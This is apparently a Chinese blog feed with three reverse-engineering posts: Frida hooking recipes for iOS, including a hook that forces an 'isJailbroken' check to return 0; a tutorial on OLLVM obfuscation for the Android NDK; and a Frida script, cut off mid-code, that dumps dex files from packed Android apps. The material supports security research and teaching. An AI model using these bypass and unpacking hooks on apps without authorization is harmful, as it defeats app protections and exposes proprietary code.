title="4.调用native函数"></a>4.调用native函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var address = Module.findExportByName(&apos;libsqlite3.dylib&apos;, &apos;sqlite3_sql&apos;);</span><br><span class="line">var sql = new NativeFunction(address, &apos;char&apos;, [&apos;pointer&apos;]);</span><br><span class="line">sql(statement);</span><br></pre></td></tr></table></figure><h4 id="5-数据类型和转换"><a href="#5-数据类型和转换" class="headerlink" title="5.数据类型和转换"></a>5.数据类型和转换</h4><p>如果对一个变量的类型不确定，可以使用如下代码确定其类型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Type of args[2] -&gt; &quot; + new ObjC.Object(args[2]).$className)</span><br></pre></td></tr></table></figure></p><p>一些常用的数据类型转换：</p><ul><li>NSData转String<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var data = new ObjC.Object(args[2]);</span><br><span class="line">Memory.readUtf8String(data.bytes(), data.length());</span><br></pre></td></tr></table></figure></li></ul><p>如果为null的不需要第二个参数</p><ul><li><p>NSData转二进制数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var data = new ObjC.Object(args[2]);</span><br><span class="line">Memory.readByteArray(data.bytes(), data.length());</span><br></pre></td></tr></table></figure></li><li><p>遍历NSArray</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var array = new ObjC.Object(args[2]);</span><br><span class="line">/*</span><br><span class="line"> * Be sure to use valueOf() as NSUInteger is a Number in</span><br><span class="line"> * 32-bit processes, and UInt64 in 64-bit processes. This</span><br><span class="line"> * coerces it into a Number in the latter case.</span><br><span class="line"> */</span><br><span class="line">var count = array.count().valueOf();</span><br><span class="line">for (var i = 0; i !== count; i++) &#123;</span><br><span class="line">  var element = array.objectAtIndex_(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>遍历NSDictionary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var dict = new ObjC.Object(args[2]);</span><br><span class="line">var enumerator = dict.keyEnumerator();</span><br><span class="line">var key;</span><br><span class="line">while ((key = enumerator.nextObject()) !== null) &#123;</span><br><span class="line">  var value = dict.objectForKey_(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>NSKeyedArchiver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var parsedValue = ObjC.classes.NSKeyedUnarchiver.unarchiveObjectWithData_(value);</span><br></pre></td></tr></table></figure></li><li><p>读一个结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Memory.readU32(args[0].add(4));</span><br></pre></td></tr></table></figure></li></ul><h3 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h3><h4 id="1-枚举所有的类"><a href="#1-枚举所有的类" class="headerlink" title="1.枚举所有的类"></a>1.枚举所有的类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (var className in ObjC.classes)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ObjC.classes.hasOwnProperty(className))</span><br><span class="line">        &#123;</span><br><span class="line">            send(className);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-枚举一个类的所有method"><a href="#2-枚举一个类的所有method" class="headerlink" title="2.枚举一个类的所有method"></a>2.枚举一个类的所有method</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if (ObjC.available)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        var className = &quot;NSURL&quot;;</span><br><span class="line">        var methods = eval(&apos;ObjC.classes.&apos; + className + &apos;.$methods&apos;);</span><br><span class="line">        for (var i = 0; i &lt; methods.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                if (methods[i].indexOf(&quot;fileURLWithPath&quot;) &gt; -1)</span><br><span class="line">                console.log(&quot;[-] &quot;+methods[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            catch(err)</span><br><span class="line">            &#123;</span><br><span class="line">                console.log(&quot;[!] Exception1: &quot; + err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch(err)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(&quot;[!] Exception2: &quot; + err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-Hook一个method"><a href="#3-Hook一个method" class="headerlink" title="3. Hook一个method"></a>3. Hook一个method</h4><p>打印参数时需要注意：</p><ul><li>args[0]：self</li><li>args[1]：The selector (openURL:)</li><li>args[2]：The first param</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if (ObjC.available)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        var className = &quot;JailbreakDetectionVC&quot;;</span><br><span class="line">        var funcName = &quot;- isJailbroken&quot;;</span><br><span class="line">        var hook = eval(&apos;ObjC.classes.&apos; + className + &apos;[&quot;&apos; + funcName + &apos;&quot;]&apos;);</span><br><span class="line">        console.log(&quot;[*] Class Name: &quot; + className);</span><br><span class="line">        console.log(&quot;[*] Method Name: &quot; + funcName);</span><br><span class="line">        Interceptor.attach(hook.implementation, &#123;</span><br><span class="line">          onEnter: function(args) &#123;</span><br><span class="line">            console.log(&quot;aaaa&quot;);</span><br><span class="line">            console.log(&quot;param:&quot;+args[2]+&quot; type:&quot;+typeof args[2]);</span><br><span class="line">          &#125;,</span><br><span class="line">          onLeave: function(retval) &#123;</span><br><span class="line">            console.log(&quot;Return value-&gt; (type:&quot;+typeof retval+&quot;,value:&quot;+retval+&quot;)&quot;);</span><br><span class="line">            newretval = ptr(&quot;0x0&quot;)</span><br><span class="line">            retval.replace(newretval)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch(err)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(&quot;[!] Exception2: &quot; + err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-调用函数"><a href="#4-调用函数" class="headerlink" title="4.调用函数"></a>4.调用函数</h4><ul><li>函数名以”+”开头的，如：“+ URLWithString:”，可以直接通过类名调用方法，相当于java中的static函数</li><li><p>函数名以“-”开头的需要找到一个实例化的对象，然后再调用方法</p><ul><li>如果内存中没有这样的对象<br>这种情况需要手动生成一个实例,用法为ObjC.classes.类名.alloc()</li><li><p>如果内存中存在实例化后的对象<br>这种情况需要先找出一个类的实例,使用var tmp=ObjC.chooseSync(ObjC.classes.类名),例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0]</span><br></pre></td></tr></table></figure><p>其中[0]表示取找到的实例中的第一个实例,可根据实际情况换成其他的实例。<br>调用函数时，以my_obj<a href="">“- requestUploadWithSure”</a>的函数，如果有参数直接附在括号中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (ObjC.available)</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        //var my_obj=ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0]</span><br><span class="line">        var my_obj=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc()</span><br><span class="line">        my_obj[&quot;- requestUploadWithSure:&quot;](1)</span><br><span class="line">    &#125;</span><br><span class="line">    catch(err)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(&quot;[!] Exception2: &quot; + err.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    console.log(&quot;Objective-C Runtime is not available!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>利用ollvm进行代码混淆</title>
      <link href="/2018/08/23/ollvm%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/23/ollvm%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="OLLVM简介"><a href="#OLLVM简介" class="headerlink" title="OLLVM简介"></a>OLLVM简介</h2><p>OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学于2010年6月份发起的一个项目，该项目旨在提供一套开源的针对LLVM的代码混淆工具，以增加对逆向工程的难度。</p><p>OLLVM是基于LLVM实现的，LLVM是一个编译器框架，它也采用经典的三段式设计。前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树AST，然后将分析好的代码转换成LLVM的中间表示IR（intermediate representation）；中间部分的优化器只对中间表示IR操作，通过一系列的Pass对IR做优化；后端负责将优化好的IR解释成对应平台的机器码。LLVM的优点在于，不同的前端语言最终都转换成同一种的IR。</p><p>OLLVM的混淆操作就是在中间表示IR层，通过编写Pass来混淆IR，然后后端依据IR来生成的目标代码也就被混淆了。得益于LLVM的设计，OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。</p><h2 id="OLLVM的几种混淆方式"><a href="#OLLVM的几种混淆方式" class="headerlink" title="OLLVM的几种混淆方式"></a>OLLVM的几种混淆方式</h2><p>OLLVM默认支持 -fla -sub -bcf 三个混淆参数，这三个参数可以单独使用，也可以配合着使用。-fla 参数表示使用控制流平展（Control Flow Flattening）模式，-sub参数表示使用指令替换（Instructions Substitution）模式，-bcf参数表示使用控制流伪造（Bogus Control Flow）模式</p><ul><li>-sub <strong>instruction substitution(指令替换)</strong></li><li>-fla <strong>control flow flattening（控制流平坦化）</strong></li><li>-bcf <strong>bogus control flow（控制流伪造）</strong></li></ul><p>此外，OLLVM支持对单个函数进行混淆，即Functions annotations模式</p><p>以下分别介绍这几种方式并举例说明：</p><h3 id="instruction-substitution-指令替换"><a href="#instruction-substitution-指令替换" class="headerlink" title="instruction substitution(指令替换)"></a>instruction substitution(指令替换)</h3><p>指令替换是一种比较简单的混淆方式，OLLVM将一些简单的运算复杂化，但这种方式容易被代码优化给去除，目前OLLVM只实现对整数运算的混淆。</p><ul><li>加法混淆</li></ul><p>例如 a = b + c 可以被混淆为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  a = b - (-c)</span><br><span class="line">2.  a = -(-b + (-c))</span><br><span class="line">3.  r = rand (); a = b + r; a = a + c; a = a - r</span><br><span class="line">4.  r = rand (); a = b - r; a = a + b; a = a + r</span><br></pre></td></tr></table></figure><ul><li>减法混淆<br>例如 a = b-c 可以被混淆为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. a = b + (-c)</span><br><span class="line">2. r = rand (); a = b + r; a = a - c; a = a - r</span><br><span class="line">3. r = rand (); a = b - r; a = a - c; a = a + r</span><br></pre></td></tr></table></figure><ul><li>AND运算混淆</li></ul><p>a = b &amp; c =&gt; a = (b ^ ~c) &amp; b</p><ul><li>OR运算混淆</li></ul><p>a = b | c =&gt; a = (b &amp; c) | (b ^ c)</p><ul><li>XOR运算混淆</li></ul><p>a = a ^ b =&gt; a = (~a &amp; b) | (a &amp; ~b)</p><p>如果一种运算对应多种混淆方式，OLLVM将会随机选择一种，以下为使用OLLVM进行指令替换后的前后对比：</p><pre><code>源码：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int test(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">  int c = a + b;</span><br><span class="line">  return c+2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>sub前：</code></pre><p><img src="/images/pasted-126.png" alt="upload successful"></p><pre><code>sub后</code></pre><p><img src="/images/pasted-127.png" alt="upload successful"></p><p>分析汇编指令得出，a+b+2 运算变成了 -(-b-(a+2))</p><h3 id="control-flow-flattening（控制流平坦化）"><a href="#control-flow-flattening（控制流平坦化）" class="headerlink" title="control flow flattening（控制流平坦化）"></a>control flow flattening（控制流平坦化）</h3><p>control flow flattening（控制流平坦化）通过多个case-swich结构将程序的控制流变成扁平形状，打破原有的逻辑结构，增加逆向的难度。<br>例如对于以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  int a = atoi(argv[1]);</span><br><span class="line">  if(a == 0)</span><br><span class="line">    return 1;</span><br><span class="line">  else</span><br><span class="line">    return 10;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>OLLVM将把它变为如下结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  int a = atoi(argv[1]);</span><br><span class="line">  int b = 0;</span><br><span class="line">  while(1) &#123;</span><br><span class="line">    switch(b) &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        if(a == 0)</span><br><span class="line">          b = 1;</span><br><span class="line">        else</span><br><span class="line">          b = 2;</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        return 1;</span><br><span class="line">      case 2:</span><br><span class="line">        return 10;</span><br><span class="line">      default:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从代码中可以看到，OLLVM将源代码分割为几个基本块，并放在一个while循环结构中无线循环，程序的流程由变量b控制。</p><p>以下是使用OLLVM进行控制混淆后的前后对比：</p><pre><code>源码</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  int a = atoi(argv[1]);</span><br><span class="line">  if(a == 0)</span><br><span class="line">    return 1;</span><br><span class="line">  else</span><br><span class="line">    return 10;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>fla之前：</code></pre><p><img src="/images/pasted-128.png" alt="upload successful"></p><pre><code>fla之后：</code></pre><p><img src="/images/pasted-129.png" alt="upload successful"></p><pre><code>F5之后的代码：  </code></pre><p><img src="/images/pasted-130.png" alt="upload successful"></p><p>由此可见，fla之后的控制流比较复杂，通过分析fla之后的代码，我们发现代码中的result仅仅受v7的影响，但分析起来着实费力。</p><h3 id="bogus-control-flow（控制流伪造）"><a href="#bogus-control-flow（控制流伪造）" class="headerlink" title="bogus control flow（控制流伪造）"></a>bogus control flow（控制流伪造）</h3><p>bogus control flow通过在源程序的控制流中添加一些基本块，这些基本块仅仅起了连接作用，并不影响实际的执行逻辑。</p><p>以下为使用OLLVM进行控制流伪造后的对比：<br>    源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  int a = atoi(argv[1]);</span><br><span class="line">  if(a == 0)</span><br><span class="line">    return 1;</span><br><span class="line">  else</span><br><span class="line">    return 10;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><pre><code>bcf之前：![upload successful](/images/pasted-128.png)bcf之后：   ![upload successful](/images/pasted-131.png)F5之后的代码：![upload successful](/images/pasted-132.png)由此看出，bcf的方式在程序中增加了一个代码块，这个代码块对函数返回值没有任何影响，但对于逆向人员来说，增加了其逆向分析的无用功。</code></pre><h3 id="Functions-annotations"><a href="#Functions-annotations" class="headerlink" title="Functions annotations"></a>Functions annotations</h3><p>有时候为了提高效率，开发者仅需要对指定的函数进行混淆，OLLVM的Functions annotations模式支持对单个函数进行混淆。比如，想对函数func()使用bcf混淆，只需要给函数func()增加bcf属性即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int func() __attribute((__annotate__((&quot;bcf&quot;))));</span><br></pre></td></tr></table></figure></p><p>OLLVM的fla，sub和bcf三个属性可以搭配使用，只需要添加对应的编译选项即可。</p><h2 id="利用OLLVM进行Android-native代码混淆"><a href="#利用OLLVM进行Android-native代码混淆" class="headerlink" title="利用OLLVM进行Android native代码混淆"></a>利用OLLVM进行Android native代码混淆</h2><h3 id="1-下载并编译ollvm"><a href="#1-下载并编译ollvm" class="headerlink" title="1.下载并编译ollvm"></a>1.下载并编译ollvm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</span><br><span class="line">$ mkdir build</span><br><span class="line">$ cd build</span><br><span class="line">$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/</span><br><span class="line">$ make -j7</span><br></pre></td></tr></table></figure><h3 id="2-配置NDK以支持ollvm"><a href="#2-配置NDK以支持ollvm" class="headerlink" title="2.配置NDK以支持ollvm"></a>2.配置NDK以支持ollvm</h3><ul><li>新建编译链<br>在 android-ndk-r14b/toolchains 下新建目录 ollvm-4.0/prebuilt/darwin-x86_64(我的环境是mac)，把前一步编译生成的结果拷贝到此目录下（主要是bin和lib）</li><li>配置编译链<br>在 android-ndk-r14b/build/core/toolchains 目录下，新建目录 arm-linux-androideabi-clang-ollvm4.0，拷贝目录 arm-linux-androideabi-clang 下的文件 config.mk 与 setup.mk 到 arm-linux-androideabi-clang-ollvm4.0 中，修改setup.mk文件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">############################ 原始配置 ############################</span><br><span class="line">#LLVM_TOOLCHAIN_PREBUILT_ROOT := $(call get-toolchain-root,llvm)</span><br><span class="line">#LLVM_TOOLCHAIN_PREFIX := $(LLVM_TOOLCHAIN_PREBUILT_ROOT)/bin/</span><br><span class="line">#################################################################</span><br><span class="line">############################ 修改后 #############################</span><br><span class="line">OLLVM_NAME := ollvm-4.0</span><br><span class="line">LLVM_TOOLCHAIN_PREBUILT_ROOT := $(call get-toolchain-root,$(OLLVM_NAME))</span><br><span class="line">LLVM_TOOLCHAIN_PREFIX := $(LLVM_TOOLCHAIN_PREBUILT_ROOT)/bin/</span><br><span class="line">#其他配置不做修改</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-使用ollvm进行编译"><a href="#3-使用ollvm进行编译" class="headerlink" title="3.使用ollvm进行编译"></a>3.使用ollvm进行编译</h3><p>使用 ollvm 进行 ndk 的编译需要对 Application.mk 和 Android.mk 文件做相应的修改。<br>Android.mk 中添加混淆编译参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_CFLAGS += -mllvm -sub -mllvm -bcf -mllvm -fla</span><br></pre></td></tr></table></figure></p><p>Application.mk 中配置 NDK_TOOLCHAIN_VERSION<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">APP_ABI := x86 armeabi-v7a x86_64 arm64-v8a armeabi mips64</span><br><span class="line">NDK_TOOLCHAIN_VERSION := clang-ollvm-4.0</span><br></pre></td></tr></table></figure></p><p>参考资料：</p><ol><li>OLLVM wiki <a href="https://github.com/obfuscator-llvm/obfuscator/wiki" target="_blank" rel="noopener">https://github.com/obfuscator-llvm/obfuscator/wiki</a></li><li>利用OLLVM混淆Android Native代码 <a href="https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/" target="_blank" rel="noopener">https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/</a></li><li>OLLVM + NDK 混淆编译环境搭建<a href="http://gnaixx.cc/2017/07/25/20170725-ollvm/" target="_blank" rel="noopener">http://gnaixx.cc/2017/07/25/20170725-ollvm/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android基于OpenMemory的脱壳</title>
      <link href="/2018/08/22/Android%E5%9F%BA%E4%BA%8EOpenMemory%E7%9A%84%E8%84%B1%E5%A3%B3/"/>
      <url>/2018/08/22/Android%E5%9F%BA%E4%BA%8EOpenMemory%E7%9A%84%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="OpenMemory"><a href="#OpenMemory" class="headerlink" title="OpenMemory"></a>OpenMemory</h2><p>Android ART加载外部dex本质上调用DexFile::OpenMemory()加载到内存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;const DexFile&gt; DexFile::OpenMemory(const uint8_t* base,</span><br><span class="line">                                                   size_t size,</span><br><span class="line">                                                   const std::string&amp; location,</span><br><span class="line">                                                   uint32_t location_checksum,</span><br><span class="line">                                                   MemMap* mem_map,</span><br><span class="line">                                                   const OatDexFile* oat_dex_file,</span><br><span class="line">                                                   std::string* error_msg) &#123;</span><br><span class="line">  CHECK_ALIGNED(base, 4);  // various dex file structures must be word aligned</span><br><span class="line">  std::unique_ptr&lt;DexFile&gt; dex_file(</span><br><span class="line">      new DexFile(base, size, location, location_checksum, mem_map, oat_dex_file));</span><br><span class="line">  if (!dex_file-&gt;Init(error_msg)) &#123;</span><br><span class="line">    dex_file.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  return std::unique_ptr&lt;const DexFile&gt;(dex_file.release());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>OpenMemory第一个参数为指向dex文件的指针，因此hook OpenMemory函数，读取第一个参数作为dump起始地址，根据dex文件格式，0x20偏移处为dex的长度，进而dump出整个dex文件。</p><h2 id="Frida插件之frida-unpack"><a href="#Frida插件之frida-unpack" class="headerlink" title="Frida插件之frida-unpack"></a>Frida插件之frida-unpack</h2><p>基于以上原理，github上有人给出了基于frida hook OpenMemory的插件（<a href="https://github.com/dstmath/frida-unpack），作者只给出了32位libart.so的代码，这里附上64位的代码。" target="_blank" rel="noopener">https://github.com/dstmath/frida-unpack），作者只给出了32位libart.so的代码，这里附上64位的代码。</a></p><p>那么如何确定该用32位还是64位呢？运行cat /proc/pid/maps |grep libart.so，如果libart.so的路径位于/system/lib64,则使用64位版本代码，否则使用32位。</p><p>附代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">//代码在android os: 7.1.2上测试通过</span><br><span class="line">//32位的libart.so </span><br><span class="line">var openmemory = Module.findExportByName(&quot;libart.so&quot;, &quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);</span><br><span class="line"></span><br><span class="line">console.log(&quot;openmemory addr: &quot;+openmemory);</span><br><span class="line">Interceptor.attach(openmemory, &#123;</span><br><span class="line">    onEnter: function (args) &#123;</span><br><span class="line">      </span><br><span class="line">        //dex起始位置</span><br><span class="line">        var begin = args[1]</span><br><span class="line">        console.log(begin);</span><br><span class="line">        //打印magic</span><br><span class="line">        console.log(&quot;magic : &quot; + Memory.readUtf8String(begin))</span><br><span class="line">        //dex fileSize 地址</span><br><span class="line">        var address = parseInt(begin,16) + 0x20</span><br><span class="line">        //dex 